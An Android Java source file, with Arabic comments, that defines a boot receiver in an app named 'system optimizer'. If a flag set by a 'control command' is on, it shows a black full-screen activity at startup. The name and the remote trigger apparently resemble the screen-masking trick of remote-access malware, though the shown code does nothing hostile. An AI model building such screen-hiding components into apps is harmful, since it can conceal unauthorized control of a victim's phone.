package com.example.systemoptimizer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

public class BlackScreenBootReceiver extends BroadcastReceiver {

    private static final String PREFS_NAME = "system_optimizer_prefs";
    private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            return;
        }

        // لا تظهر الشاشة السوداء إلا إذا تم تفعيلها صراحةً عبر أمر التحكم
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        if (!prefs.getBoolean(PREFS_BLACK_SCREEN_ON_BOOT, false)) {
            return;
        }

        try {
            Intent blackScreenIntent = new Intent(context, BlackScreenActivity.class);
            blackScreenIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(blackScreenIntent);
        } catch (Exception e) {
            // بدء الأنشطة من مستقبل BOOT_COMPLETED محظور على Android 10+
            // ولا يمكن الالتفاف حول هذا القيد برمجياً.
            android.util.Log.w("BlackScreenBootReceiver",
                    "cannot start activity from boot: " + e.getMessage());
        }
    }
}